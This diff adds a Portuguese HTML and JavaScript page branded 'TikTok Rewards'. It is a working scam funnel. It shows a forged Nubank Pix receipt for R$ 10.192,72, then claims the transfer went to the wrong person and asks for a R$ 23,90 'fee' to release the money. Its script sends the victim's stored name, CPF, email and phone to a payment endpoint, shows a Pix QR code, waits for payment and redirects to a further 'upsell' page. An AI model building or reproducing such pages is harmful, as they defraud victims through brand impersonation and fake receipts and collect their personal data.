@@ -1,0 +1,494 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>TikTok Rewards</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap');
+
+    body {
+      font-family: 'Inter', sans-serif;
+      margin: 0;
+      background-color: #000;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    .tt-pink {
+      background-color: #FE2C55;
+    }
+
+    .nu-purple {
+      background-color: #830AD1;
+    }
+
+    .hidden {
+      display: none;
+    }
+
+    /* Estilo App Nubank */
+    .receipt-container {
+      background-color: #ffffff;
+      min-height: 100vh;
+      color: #1a1a1a;
+      position: relative;
+    }
+
+    .label-gray {
+      color: #767676;
+      font-size: 14px;
+      font-weight: 500;
+    }
+
+    .value-dark {
+      color: #1a1a1a;
+      font-size: 16px;
+      font-weight: 700;
+    }
+
+    .divider {
+      height: 1px;
+      background-color: #f0f0f0;
+      width: 100%;
+      margin: 18px 0;
+    }
+
+    #confirmBox {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      background: white;
+      padding: 28px 22px 48px 22px;
+      border-radius: 28px 28px 0 0;
+      box-shadow: 0 -15px 50px rgba(0, 0, 0, 0.18);
+      transform: translateY(100%);
+      transition: transform 0.5s cubic-bezier(0.32, 1, 0.2, 1);
+      z-index: 1000;
+    }
+
+    #confirmBox.active {
+      transform: translateY(0);
+    }
+
+    .pulse-red {
+      animation: pulse-red 2s infinite;
+    }
+
+    @keyframes pulse-red {
+      0% {
+        box-shadow: 0 0 0 0 rgba(254, 44, 85, 0.4);
+      }
+
+      70% {
+        box-shadow: 0 0 0 15px rgba(254, 44, 85, 0);
+      }
+
+      100% {
+        box-shadow: 0 0 0 0 rgba(254, 44, 85, 0);
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+  <div id="upsellScreen">
+
+    <div id="step1" class="min-h-screen flex flex-col items-center justify-center px-8 text-center bg-[#121212]">
+
+      <div
+        class="w-24 h-24 bg-white/5 rounded-full flex items-center justify-center mb-8 border border-white/10 shadow-2xl">
+        <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#FE2C55" stroke-width="3">
+          <polyline points="20 6 9 17 4 12"></polyline>
+        </svg>
+      </div>
+
+      <h2 class="text-white text-3xl font-black mb-4 leading-tight tracking-tight">Saque processado!</h2>
+      <p class="text-gray-400 text-lg mb-12 max-w-[280px] mx-auto leading-relaxed">O valor de <span
+          class="text-white font-bold text-xl block mt-2">R$ 10.192,72</span> foi enviado para sua conta via Pix.</p>
+
+      <button onclick="toStep2()"
+        class="w-full tt-pink py-5 text-white font-black uppercase tracking-[0.2em] text-sm rounded-2xl active:scale-95 transition-all shadow-xl">
+        Ver comprovante pix
+      </button>
+    </div>
+
+    <div id="step2" class="hidden receipt-container">
+      <div class="flex justify-between items-center px-6 py-6 border-b border-gray-50">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#333" stroke-width="2.5">
+          <path d="M18 6L6 18M6 6l12 12" />
+        </svg>
+        <img src="https://logospng.org/download/nubank/logo-nu-nubank-roxo-icon-1024.png" class="h-8">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#830AD1" stroke-width="2.5">
+          <path d="M4 12v8a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-8M16 6l-4-4-4 4M12 2v13" />
+        </svg>
+      </div>
+
+      <div class="px-8 pt-10 pb-44">
+        <h1 class="text-[24px] font-bold text-[#1a1a1a] mb-10 tracking-tight">Comprovante de transferência</h1>
+
+        <div class="mb-10">
+          <p class="label-gray mb-1">Valor</p>
+          <p class="text-[38px] font-bold text-[#1a1a1a] leading-tight">R$ 10.192,72</p>
+        </div>
+
+        <div class="space-y-1">
+          <div class="py-1">
+            <p class="label-gray">Destinatário</p>
+            <p class="value-dark mt-1">Maria dos Santos Souza</p>
+            <p class="text-[#767676] text-[15px]">CPF: ***.361.***-**</p>
+            <p class="text-[#767676] text-[15px]">Instituição: 181 - Nu Pagamentos S.A.</p>
+          </div>
+          <div class="divider"></div>
+          <div class="py-1">
+            <p class="label-gray">Origem</p>
+            <p class="value-dark mt-1 uppercase">TIKTOK REWARDS BRASIL</p>
+            <p class="text-[#767676] text-[15px]">CNPJ: 13.141.251/0001-05</p>
+          </div>
+          <div class="divider"></div>
+          <div class="py-1">
+            <p class="label-gray">ID da transação</p>
+            <p class="text-[#767676] text-[13px] font-mono mt-2 break-all uppercase leading-relaxed" id="idTransacao">
+            </p>
+          </div>
+          <div class="divider"></div>
+          <div class="py-1 text-center mt-8">
+            <p class="label-gray mb-1">Data e Hora</p>
+            <p class="value-dark" id="dataAtual"></p>
+          </div>
+        </div>
+
+        <div class="mt-16 flex justify-center">
+          <img src="https://logospng.org/download/nubank/logo-nu-nubank-roxo-icon-1024.png"
+            class="h-10 opacity-[0.08] grayscale">
+        </div>
+      </div>
+
+      <div id="confirmBox">
+        <h3 class="text-[20px] font-black mb-2 text-gray-900">Este Pix é seu?</h3>
+        <p class="text-gray-500 text-[14px] mb-8 leading-relaxed">O TikTok identificou que os dados da conta de <b>Maria
+            dos Santos Souza</b> não coincidem com o seu CPF. Deseja confirmar este envio de <b>R$ 10.192,72</b>?</p>
+        <div class="space-y-3">
+          <button
+            class="w-full border-2 border-gray-100 text-gray-300 py-4 rounded-full font-bold text-xs uppercase tracking-widest">Sim,
+            este Pix é meu</button>
+          <button onclick="toStep3()"
+            class="w-full nu-purple text-white py-4 rounded-full font-bold text-[15px] shadow-xl uppercase tracking-wider active:scale-95 transition-all">NÃO,
+            NÃO É MEU PIX!</button>
+        </div>
+      </div>
+    </div>
+
+    <div id="step3" class="hidden bg-[#f8fafc] min-h-screen text-[#121212]">
+      <div
+        class="bg-[#CC0000] text-white text-center py-4 px-4 text-[10px] font-black uppercase tracking-tight w-full sticky top-0 z-50">
+        ⚠️ ERRO NO PROCESSAMENTO: DIVERGÊNCIA DE DADOS IDENTIFICADA PELO SISTEMA BANCÁRIO
+      </div>
+
+      <div class="max-w-md mx-auto bg-white min-h-screen shadow-2xl pb-10">
+        <div class="flex justify-between items-center px-6 py-8 border-b border-gray-100">
+          <div class="flex flex-col">
+            <span class="text-[10px] font-bold text-gray-400 uppercase tracking-widest">Saldo Enviado Errado</span>
+            <span class="text-4xl font-black text-red-600 tracking-tighter"> R$ 10.192,72</span>
+          </div>
+        </div>
+
+        <div class="px-6 py-10">
+          <div class="text-center mb-10">
+            <div class="text-6xl mb-6">🔒</div>
+            <h1 class="text-[26px] font-black text-slate-800 mb-2 leading-tight">Ativação de Proteção Pix</h1>
+            <p class="text-sm font-bold text-red-600 bg-red-50 py-2 px-5 rounded-full inline-block">Erro de titularidade
+              identificado.</p>
+          </div>
+
+          <div
+            class="bg-gray-50 border-2 border-dashed border-red-200 rounded-[2rem] p-7 mb-10 text-[14px] text-gray-700 leading-relaxed font-medium">
+            ⚠️ <b>Atenção:</b> Saques recentes foram revertidos por falha bancária e divergência de chave Pix. O sistema
+            identificou que os dados informados não coincidem com o titular.
+          </div>
+
+          <div class="mb-10 space-y-5">
+            <label class="block text-[11px] font-black text-gray-400 uppercase tracking-widest ml-1">Chave Pix Destino
+              Correta:</label>
+            <input type="text" placeholder="Digite sua Chave Pix aqui..."
+              class="w-full p-5 rounded-2xl border-2 border-gray-100 bg-gray-50 text-lg font-bold focus:border-[#FE2C55] focus:outline-none shadow-inner">
+          </div>
+
+          <div class="bg-black rounded-[2rem] p-8 text-white text-center mb-8 pulse-red border-b-8 border-[#FE2C55]">
+            <span class="text-[11px] uppercase font-black tracking-widest opacity-50">Taxa de Atualização de Vaga</span>
+            <div class="text-5xl font-black my-3 tracking-tighter" id="price">R$ 23,90</div>
+            <p class="text-[12px] font-black text-[#FE2C55]">LIBERAÇÃO IMEDIATA DO NOVO PIX</p>
+          </div>
+
+          <a onclick="initiateCheckout(event)"
+            class="block w-full tt-pink text-white text-center py-6 rounded-2xl shadow-xl font-black text-xl uppercase tracking-tight active:scale-95 transition-all">
+            ✅ CONCLUIR COM SEGURANÇA
+          </a>
+        </div>
+      </div>
+    </div>
+
+  </div> <!-- fim upsellScreen -->
+
+  <!-- QR Code / PIX Section -->
+  <div id="qrcodeSection" class="hidden" style="padding: 0 16px;">
+    <div class="px-6 pt-10 pb-8 flex flex-col items-center border-b border-gray-50 bg-white">
+      <img src="https://i.postimg.cc/XYwkPWhz/imagem-2026-01-02-213823889.png" alt="TikTok Logo"
+        class="h-28 w-28 object-contain mb-6 logo-sharp drop-shadow-sm" />
+      <div class="text-center">
+        <p class="text-[11px] font-bold text-gray-400 uppercase tracking-[0.2em] mb-1">
+          Valor do Pagamento
+        </p>
+        <h2 class="text-5xl font-[900] text-[#161823] tracking-tighter" id="paymentValue">
+          R$ 0,00
+        </h2>
+      </div>
+    </div>
+    <div class="text-center mb-6">
+      <h3 class="text-2xl font-black mb-2 text-gray-900">
+        Escaneie o QR Code
+      </h3>
+      <p class="text-gray-500 text-sm">Ou copie o código PIX abaixo</p>
+    </div>
+    <div
+      class="bg-gradient-to-br from-gray-50 to-white border-2 border-gray-200 rounded-2xl p-6 mb-6 flex justify-center shadow-inner">
+      <img id="qrCodeImage" src="#" alt="QR Code PIX" class="max-w-full rounded-lg" />
+    </div>
+    <div class="mb-6">
+      <label class="block text-sm font-bold text-gray-700 mb-3">Código PIX (Copiar e Colar)</label>
+      <div class="flex gap-2">
+        <input type="text" id="pixCode" readonly
+          class="flex-1 p-4 rounded-xl border-2 border-gray-200 bg-gray-50 text-xs font-mono" />
+        <button
+          class="tt-pink px-6 py-4 rounded-xl text-white font-bold uppercase text-xs shadow-lg hover:opacity-90 transition-all"
+          id="copy-pix-button">
+          COPIAR
+        </button>
+      </div>
+    </div>
+
+    <div class="bg-blue-50 border-l-4 border-blue-500 p-4 rounded-r-lg mb-4">
+      <p class="text-sm text-gray-700">
+        <strong class="text-blue-700">Aguardando pagamento...</strong><br />
+        <span class="text-gray-600">O status será atualizado automaticamente.</span>
+      </p>
+    </div>
+    <div id="paymentStatus" class="text-center text-sm font-bold text-gray-600 mb-4">
+      Status: Aguardando pagamento
+    </div>
+  </div>
+
+  <!-- Sucesso -->
+  <div id="successSection" class="hidden px-6 py-8">
+    <div class="text-center">
+      <div class="w-20 h-20 bg-green-500 rounded-full flex items-center justify-center mx-auto mb-6">
+        <svg class="w-10 h-10 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"></path>
+        </svg>
+      </div>
+      <h3 class="text-2xl font-black mb-2 text-green-600">
+        Pagamento Confirmado!
+      </h3>
+      <p class="text-gray-600 mb-6">Seu saque será liberado em breve.</p>
+    </div>
+  </div>
+
+  <script>
+    function setupData() {
+      const d = new Date();
+      const months = ["Jan", "Fev", "Mar", "Abr", "Mai", "Jun", "Jul", "Ago", "Set", "Out", "Nov", "Dez"];
+      let eId = "E" + Math.floor(Math.random() * 1000000000).toString() + d.getTime().toString() + "7290KID";
+      document.getElementById('idTransacao').innerText = eId;
+      document.getElementById('dataAtual').innerText = `${d.getDate()} ${months[d.getMonth()]} ${d.getFullYear()} - ${d.getHours()}:${d.getMinutes().toString().padStart(2, '0')}:${d.getSeconds().toString().padStart(2, '0')}`;
+    }
+
+    function toStep2() {
+      setupData();
+      document.getElementById('step1').classList.add('hidden');
+      document.getElementById('step2').classList.remove('hidden');
+      window.scrollTo(0, 0);
+      setTimeout(() => { document.getElementById('confirmBox').classList.add('active'); }, 2500);
+    }
+
+    function toStep3() {
+      document.getElementById('step2').classList.add('hidden');
+      document.getElementById('step3').classList.remove('hidden');
+      window.scrollTo(0, 0);
+    }
+  </script>
+
+  <script>
+    const upsellScreen = document.getElementById("upsellScreen");
+    const pixQrCodeScreen = document.getElementById("qrcodeSection");
+    const pixSuccessScreen = document.getElementById("successSection");
+    const qrCodeImage = document.getElementById("qrCodeImage");
+    const pixCode = document.getElementById("pixCode");
+    const paymentField = document.getElementById("paymentValue");
+    const body = document.body;
+
+    const pathParts = window.location.pathname.split('/').filter(Boolean);
+    const baseFolder = pathParts[0];
+
+    let currentUpsellVal = 2390;
+
+    const price = document.getElementById("price");
+    async function fetchUpsellValue() {
+      try {
+        const urlParams = new URLSearchParams(window.location.search);
+        const uId = urlParams.get("upsell") || "up3";
+        const req = await fetch(`/${baseFolder}/get-upsell-value.php?upsell=${uId}`);
+        const res = await req.json();
+        if (res.success) {
+          currentUpsellVal = Math.round(res.value * 100);
+          price.textContent = formatPrice(currentUpsellVal / 100);
+        }
+      } catch (e) {
+        console.error("Erro ao buscar valor do upsell", e);
+      }
+    }
+
+    fetchUpsellValue();
+
+    function formatPrice(value) {
+      return `R$ ${parseFloat(value)
+        .toFixed(2)
+        .replace(".", ",")}`;
+    }
+
+    let pollingInterval;
+    let pollingAttempts = 0;
+    const MAX_POLLING_ATTEMPTS = 60;
+
+    async function initiateCheckout(event) {
+      event.preventDefault();
+
+      const clientRawData = localStorage.getItem("clientData");;
+      const clientData = clientRawData ? JSON.parse(clientRawData) : null;
+
+      try {
+        const name = clientData?.nome
+          ? clientData.nome.trim()
+          : "Cliente Upsell";
+        const document = clientData?.document || "";
+        const email = clientData?.email || "";
+        const phone = clientData?.phone || "";
+
+        const formData = new FormData();
+        formData.append("priceInCents", currentUpsellVal);
+        formData.append("email", email);
+        formData.append("name", name);
+        formData.append("document", document);
+        formData.append("phone", phone);
+
+        const urlParams = new URLSearchParams(window.location.search);
+
+        const utmData = {
+          utm_source:
+            urlParams.get("utm_source") ||
+            localStorage.getItem("utm_source") ||
+            "",
+          utm_medium:
+            urlParams.get("utm_medium") ||
+            localStorage.getItem("utm_medium") ||
+            "",
+          utm_campaign:
+            urlParams.get("utm_campaign") ||
+            localStorage.getItem("utm_campaign") ||
+            "",
+          utm_content:
+            urlParams.get("utm_content") ||
+            localStorage.getItem("utm_content") ||
+            "",
+          utm_term:
+            urlParams.get("utm_term") ||
+            localStorage.getItem("utm_term") ||
+            "",
+          xcod: urlParams.get("xcod") || localStorage.getItem("xcod") || "",
+          sck: urlParams.get("sck") || localStorage.getItem("sck") || "",
+        };
+
+        Object.entries(utmData).forEach(([key, value]) => {
+          formData.append(key, value);
+        });
+
+        const response = await fetch(`/${baseFolder}/pagamento.php`, {
+          method: "POST",
+          body: formData,
+        });
+        const responseData = await response.json();
+
+        if (responseData.success) {
+          if (upsellScreen) {
+            upsellScreen.style.display = "none";
+          }
+          body.style.backgroundColor = "#ffffff";
+          pixQrCodeScreen.classList.remove("hidden");
+          qrCodeImage.src = responseData.qrCodeUrl;
+          pixCode.value = responseData.pixCode;
+          paymentField.textContent = formatPrice(currentUpsellVal / 100);
+          startPaymentPolling(responseData.token);
+        } else {
+          console.error("Resposta inesperada do pagamento:", responseData);
+        }
+      } catch (error) {
+        console.error("Erro ao gerar PIX:", error);
+      }
+    }
+
+    async function startPaymentPolling(transactionToken) {
+      if (pollingInterval) clearInterval(pollingInterval);
+      pollingAttempts = 0;
+
+      pollingInterval = setInterval(async () => {
+        pollingAttempts++;
+        if (pollingAttempts > MAX_POLLING_ATTEMPTS) {
+          clearInterval(pollingInterval);
+          return;
+        }
+
+        try {
+          const response = await fetch(`/${baseFolder}/verificar.php?id=${transactionToken}`);
+          if (!response.ok) return;
+
+          const result = await response.json();
+
+          if (result.data.mangofy_data.data.payment_status === 'approved') {
+            clearInterval(pollingInterval);
+            pixQrCodeScreen.classList.add("hidden");
+            pixSuccessScreen.classList.remove("hidden");
+
+            setTimeout(() => {
+              window.location.href = `/${baseFolder}/upsell4.html${window.location.search}`;
+            }, 2000);
+          }
+        } catch (error) {
+          console.error("Polling error", error);
+        }
+      }, 5000);
+    }
+
+    const copyPixButton = document.getElementById("copy-pix-button");
+    const pixCodeText = document.getElementById("pixCode");
+
+    copyPixButton.addEventListener("click", function () {
+      if (pixCodeText.value) {
+        navigator.clipboard
+          .writeText(pixCodeText.value.trim())
+          .then(() => {
+            copyPixButton.textContent = "Código PIX copiado!";
+            setTimeout(() => {
+              copyPixButton.textContent = "COPIAR";
+            }, 3000);
+          })
+          .catch(() => {
+            copyPixButton.textContent = "Erro ao copiar.";
+          });
+      }
+    });
+  </script>
+</body>
+
+</html>
